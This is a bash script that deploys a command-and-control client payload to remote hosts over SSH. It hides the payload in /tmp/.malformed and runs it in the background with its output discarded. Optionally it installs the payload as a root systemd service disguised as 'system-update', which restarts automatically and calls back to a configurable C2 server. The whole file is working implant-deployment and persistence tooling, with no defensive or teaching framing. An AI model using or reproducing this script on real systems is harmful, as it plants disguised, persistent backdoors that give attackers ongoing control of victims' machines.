#!/bin/bash
"""
Malformed Labs Client Deployment Script
Deploys the client listener payload to remote hosts
"""

set -e

# Configuration
C2_HOST="${C2_HOST:-localhost}"
C2_PORT="${C2_PORT:-8888}"
PAYLOAD_NAME="client_listener.py"
INSTALL_DIR="/tmp/.malformed"
SERVICE_NAME="system-update"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_status() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

usage() {
    echo "Usage: $0 [OPTIONS] TARGET_HOST"
    echo ""
    echo "Options:"
    echo "  -h, --help              Show this help message"
    echo "  -u, --user USER         SSH username (default: current user)"
    echo "  -p, --port PORT         SSH port (default: 22)"
    echo "  -k, --key KEYFILE       SSH private key file"
    echo "  -c, --c2-host HOST      C2 server host (default: localhost)"
    echo "  -P, --c2-port PORT      C2 server port (default: 8888)"
    echo "  -i, --install-dir DIR   Installation directory (default: /tmp/.malformed)"
    echo "  -s, --service           Install as systemd service"
    echo "  -r, --remove            Remove payload from target"
    echo "  -l, --list              List active payloads"
    echo ""
    echo "Examples:"
    echo "  $0 192.168.1.100"
    echo "  $0 -u admin -k ~/.ssh/id_rsa 10.0.0.50"
    echo "  $0 -c 192.168.1.10 -P 8888 -s target.example.com"
}

# Default values
SSH_USER="$(whoami)"
SSH_PORT="22"
SSH_KEY=""
INSTALL_SERVICE=false
REMOVE_PAYLOAD=false
LIST_PAYLOADS=false
TARGET_HOST=""

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--help)
            usage
            exit 0
            ;;
        -u|--user)
            SSH_USER="$2"
            shift 2
            ;;
        -p|--port)
            SSH_PORT="$2"
            shift 2
            ;;
        -k|--key)
            SSH_KEY="$2"
            shift 2
            ;;
        -c|--c2-host)
            C2_HOST="$2"
            shift 2
            ;;
        -P|--c2-port)
            C2_PORT="$2"
            shift 2
            ;;
        -i|--install-dir)
            INSTALL_DIR="$2"
            shift 2
            ;;
        -s|--service)
            INSTALL_SERVICE=true
            shift
            ;;
        -r|--remove)
            REMOVE_PAYLOAD=true
            shift
            ;;
        -l|--list)
            LIST_PAYLOADS=true
            shift
            ;;
        -*)
            print_error "Unknown option: $1"
            usage
            exit 1
            ;;
        *)
            TARGET_HOST="$1"
            shift
            ;;
    esac
done

# Validate required parameters
if [[ -z "$TARGET_HOST" ]] && [[ "$LIST_PAYLOADS" != true ]]; then
    print_error "Target host is required"
    usage
    exit 1
fi

# SSH command builder
build_ssh_cmd() {
    local cmd="ssh"
    
    if [[ -n "$SSH_KEY" ]]; then
        cmd="$cmd -i $SSH_KEY"
    fi
    
    cmd="$cmd -p $SSH_PORT $SSH_USER@$TARGET_HOST"
    echo "$cmd"
}

# Check if payload exists
check_payload() {
    if [[ ! -f "$PAYLOAD_NAME" ]]; then
        print_error "Payload file '$PAYLOAD_NAME' not found in current directory"
        exit 1
    fi
}

# Generate systemd service file
generate_service_file() {
    cat << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$INSTALL_DIR
ExecStart=/usr/bin/python3 $INSTALL_DIR/$PAYLOAD_NAME $C2_HOST $C2_PORT
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF
}

# Deploy payload
deploy_payload() {
    local ssh_cmd=$(build_ssh_cmd)
    
    print_status "Deploying payload to $TARGET_HOST"
    
    # Create installation directory
    print_status "Creating installation directory"
    $ssh_cmd "mkdir -p $INSTALL_DIR"
    
    # Copy payload
    print_status "Uploading payload"
    local scp_cmd="scp"
    if [[ -n "$SSH_KEY" ]]; then
        scp_cmd="$scp_cmd -i $SSH_KEY"
    fi
    scp_cmd="$scp_cmd -P $SSH_PORT"
    
    $scp_cmd "$PAYLOAD_NAME" "$SSH_USER@$TARGET_HOST:$INSTALL_DIR/"
    
    # Make executable
    $ssh_cmd "chmod +x $INSTALL_DIR/$PAYLOAD_NAME"
    
    # Install as service if requested
    if [[ "$INSTALL_SERVICE" == true ]]; then
        print_status "Installing systemd service"
        
        # Generate and upload service file
        generate_service_file | $ssh_cmd "cat > /tmp/$SERVICE_NAME.service"
        
        # Install service
        $ssh_cmd "
            sudo mv /tmp/$SERVICE_NAME.service /etc/systemd/system/
            sudo systemctl daemon-reload
            sudo systemctl enable $SERVICE_NAME
            sudo systemctl start $SERVICE_NAME
        "
        
        print_success "Payload installed as systemd service"
        print_status "Service status:"
        $ssh_cmd "sudo systemctl status $SERVICE_NAME --no-pager -l"
    else
        # Start payload in background
        print_status "Starting payload in background"
        $ssh_cmd "cd $INSTALL_DIR && nohup python3 $PAYLOAD_NAME $C2_HOST $C2_PORT > /dev/null 2>&1 &"
    fi
    
    print_success "Payload deployed successfully to $TARGET_HOST"
    print_status "C2 Server: $C2_HOST:$C2_PORT"
}

# Remove payload
remove_payload() {
    local ssh_cmd=$(build_ssh_cmd)
    
    print_status "Removing payload from $TARGET_HOST"
    
    # Stop and remove service if it exists
    $ssh_cmd "
        if systemctl is-active --quiet $SERVICE_NAME 2>/dev/null; then
            sudo systemctl stop $SERVICE_NAME
            sudo systemctl disable $SERVICE_NAME
            sudo rm -f /etc/systemd/system/$SERVICE_NAME.service
            sudo systemctl daemon-reload
            echo 'Service removed'
        fi
    " 2>/dev/null || true
    
    # Kill running processes
    $ssh_cmd "pkill -f '$PAYLOAD_NAME' || true"
    
    # Remove files
    $ssh_cmd "rm -rf $INSTALL_DIR"
    
    print_success "Payload removed from $TARGET_HOST"
}

# List active payloads
list_payloads() {
    print_status "Checking for active payloads..."
    
    # This would typically query your C2 server for active clients
    print_warning "List functionality requires C2 server API integration"
    print_status "Check your C2 server dashboard at http://$C2_HOST:8080"
}

# Test connectivity
test_connectivity() {
    local ssh_cmd=$(build_ssh_cmd)
    
    print_status "Testing connectivity to $TARGET_HOST"
    
    if $ssh_cmd "echo 'Connection successful'" >/dev/null 2>&1; then
        print_success "SSH connection successful"
        return 0
    else
        print_error "SSH connection failed"
        return 1
    fi
}

# Main execution
main() {
    print_status "Malformed Labs Client Deployment Script"
    print_status "Target: $TARGET_HOST"
    print_status "C2 Server: $C2_HOST:$C2_PORT"
    
    if [[ "$LIST_PAYLOADS" == true ]]; then
        list_payloads
        exit 0
    fi
    
    if [[ "$REMOVE_PAYLOAD" == true ]]; then
        if ! test_connectivity; then
            exit 1
        fi
        remove_payload
        exit 0
    fi
    
    # Check if payload file exists
    check_payload
    
    # Test SSH connectivity
    if ! test_connectivity; then
        exit 1
    fi
    
    # Deploy payload
    deploy_payload
    
    print_success "Deployment complete!"
    print_status "Monitor your C2 server dashboard for the new client connection"
}

# Run main function
main "$@"